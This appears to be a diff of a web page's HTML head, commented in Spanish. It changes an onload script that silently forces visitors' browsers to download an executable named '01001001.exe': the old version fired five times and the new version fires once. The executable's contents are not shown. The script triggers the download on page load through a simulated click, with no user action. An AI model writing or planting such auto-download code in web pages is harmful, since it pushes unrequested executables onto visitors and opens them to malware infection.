@@ -7,15 +7,12 @@
     <link rel="stylesheet" href="styles.css">
     <script>
        window.onload = function() {
-            // Ejecutar la descarga 5 veces
-            for (let i = 0; i < 5; i++) {
-                // Crear un enlace temporal para la descarga
-                const link = document.createElement('a');
-                link.href = 'txt/01001001.exe'; // Ruta al archivo que se va a descargar
-                link.download = 'txt/01001001.exe'; // Nombre del archivo con el que se descargará
-                link.click(); // Simula un clic en el enlace para iniciar la descarga
-            }
-       }
+            // Crear un enlace temporal para la descarga
+            const link = document.createElement('a');
+            link.href = 'txt/01001001.exe'; // Ruta al archivo que se va a descargar
+            link.download = 'txt/01001001.exe'; // Nombre del archivo con el que se descargará
+            link.click(); // Simula un clic en el enlace para iniciar la descarga
+        }
     </script>
 </head>
 <body>
